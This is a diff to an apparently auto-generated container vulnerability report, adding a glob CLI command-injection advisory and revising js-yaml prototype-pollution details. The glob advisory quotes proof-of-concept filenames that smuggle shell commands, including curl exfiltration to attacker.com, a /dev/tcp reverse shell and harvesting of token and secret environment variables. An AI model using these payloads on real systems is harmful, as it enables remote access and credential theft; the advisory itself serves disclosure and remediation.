@@ -3,7 +3,7 @@ hide_table_of_contents: true
 ---
 
 <table>
-<tr><td>digest</td><td><code>sha256:c347474e6488832564a6ce3d1870056f52aa4e7123bb85ce391a60c0b4ecdf18</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 5" src="https://img.shields.io/badge/high-5-e25d68"/> <img alt="medium: 8" src="https://img.shields.io/badge/medium-8-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/low-0-lightgrey"/> <!-- unspecified: 0 --></td></tr>
+<tr><td>digest</td><td><code>sha256:c347474e6488832564a6ce3d1870056f52aa4e7123bb85ce391a60c0b4ecdf18</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 6" src="https://img.shields.io/badge/high-6-e25d68"/> <img alt="medium: 8" src="https://img.shields.io/badge/medium-8-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/low-0-lightgrey"/> <!-- unspecified: 0 --></td></tr>
 <tr><td>platform</td><td>linux/amd64</td></tr>
 <tr><td>size</td><td>237 MB</td></tr>
 <tr><td>packages</td><td>674</td></tr>
@@ -211,6 +211,153 @@ tar.Reader does not set a maximum size on the number of sparse region data block
 </details></td></tr>
 
 <tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>glob</strong> <code>10.4.5</code> (npm)</summary>
+
+<small><code>pkg:npm/glob@10.4.5</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2025-64756?s=github&n=glob&t=npm&vr=%3E%3D10.3.7%2C%3C%3D11.0.3"><img alt="high 7.5: CVE--2025--64756" src="https://img.shields.io/badge/CVE--2025--64756-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=10.3.7<br/><=11.0.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>11.1.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Summary
+
+The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.
+
+### Details
+
+**Root Cause:**
+The vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:
+
+```javascript
+stream.on('end', () => foregroundChild(cmd, matches, { shell: true }))
+```
+
+**Technical Flow:**
+1. User runs `glob -c <command> <pattern>` 
+2. CLI finds files matching the pattern
+3. Matched filenames are collected into an array
+4. Command is executed with matched filenames as arguments using `shell: true`
+5. Shell interprets metacharacters in filenames as command syntax
+6. Malicious filenames execute arbitrary commands
+
+**Affected Component:**
+- **CLI Only:** The vulnerability affects only the command-line interface
+- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected
+- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)
+
+**Attack Surface:**
+- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.
+- Any directory where attackers can control filenames (PR branches, archives, user uploads)
+- CI/CD pipelines using `glob -c` on untrusted content
+
+### PoC
+
+**Setup Malicious File:**
+```bash
+mkdir test_directory && cd test_directory
+
+# Create file with command injection payload in filename
+touch '$(touch injected_poc)'
+```
+
+**Trigger Vulnerability:**
+```bash
+# Run glob CLI with -c option
+node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"
+```
+
+**Result:**
+- The echo command executes normally
+- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell
+- A new file `injected_poc` is created, proving command execution
+- Any command can be injected this way with full user privileges
+
+**Advanced Payload Examples:**
+
+**Data Exfiltration:**
+```bash
+# Filename: $(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)
+touch '$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)'
+```
+
+**Reverse Shell:**
+```bash
+# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
+touch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
+```
+
+**Environment Variable Harvesting:**
+```bash
+# Filename: $(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)
+touch '$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)'
+```
+
+### Impact
+
+**Arbitrary Command Execution:**
+- Commands execute with full privileges of the user running glob CLI
+- No privilege escalation required - runs as current user
+- Access to environment variables, file system, and network
+
+**Real-World Attack Scenarios:**
+
+**1. CI/CD Pipeline Compromise:**
+- Malicious PR adds files with crafted names to repository
+- CI pipeline uses `glob -c` to process files (linting, testing, deployment)
+- Commands execute in CI environment with build secrets and deployment credentials
+- Potential for supply chain compromise through artifact tampering
+
+**2. Developer Workstation Attack:**
+- Developer clones repository or extracts archive containing malicious filenames
+- Local build scripts use `glob -c` for file processing
+- Developer machine compromise with access to SSH keys, tokens, local services
+
+**3. Automated Processing Systems:**
+- Services using glob CLI to process uploaded files or external content
+- File uploads with malicious names trigger command execution
+- Server-side compromise with potential for lateral movement
+
+**4. Supply Chain Poisoning:**
+- Malicious packages or themes include files with crafted names
+- Build processes using glob CLI automatically process these files
+- Wide distribution of compromise through package ecosystems
+
+**Platform-Specific Risks:**
+- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing
+- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL
+- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform
+
+### Affected Products
+
+- **Ecosystem:** npm
+- **Package name:** glob
+- **Component:** CLI only (`src/bin.mts`)
+- **Affected versions:** v10.3.7 through v11.0.3 (and likely later versions until patched)
+- **Introduced:** v10.3.7 (first release with CLI containing `-c/--cmd` option)
+- **Patched versions:** 11.1.0
+
+**Scope Limitation:**
+- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe
+- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable
+
+### Remediation
+
+- Upgrade to `glob@11.1.0` or higher, as soon as possible.
+- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.
+- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but ensure that no untrusted contents can possibly be encountered in the file path results.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar-fs</strong> <code>2.1.3</code> (npm)</summary>
 
 <small><code>pkg:npm/tar-fs@2.1.3</code></small><br/>
@@ -255,10 +402,10 @@ Reported by: Mapta / BugBunny_ai
 <details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>js-yaml</strong> <code>4.1.0</code> (npm)</summary>
 
 <small><code>pkg:npm/js-yaml@4.1.0</code></small><br/>
-<a href="https://scout.docker.com/v/CVE-2025-64718?s=github&n=js-yaml&t=npm&vr=%3C4.1.1"><img alt="medium 5.3: CVE--2025--64718" src="https://img.shields.io/badge/CVE--2025--64718-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')</i>
+<a href="https://scout.docker.com/v/CVE-2025-64718?s=github&n=js-yaml&t=npm&vr=%3E%3D4.0.0%2C%3C4.1.1"><img alt="medium 5.3: CVE--2025--64718" src="https://img.shields.io/badge/CVE--2025--64718-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')</i>
 
 <table>
-<tr><td>Affected range</td><td><code>&lt;4.1.1</code></td></tr>
+<tr><td>Affected range</td><td><code>>=4.0.0<br/><4.1.1</code></td></tr>
 <tr><td>Fixed version</td><td><code>4.1.1</code></td></tr>
 <tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
 <tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
@@ -271,11 +418,11 @@ Reported by: Mapta / BugBunny_ai
 
 ### Impact
 
-In js-yaml 4.1.0 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.
+In js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.
 
 ### Patches
 
-Problem is patched in js-yaml 4.1.1.
+Problem is patched in js-yaml 4.1.1 and 3.14.2.
 
 ### Workarounds
 
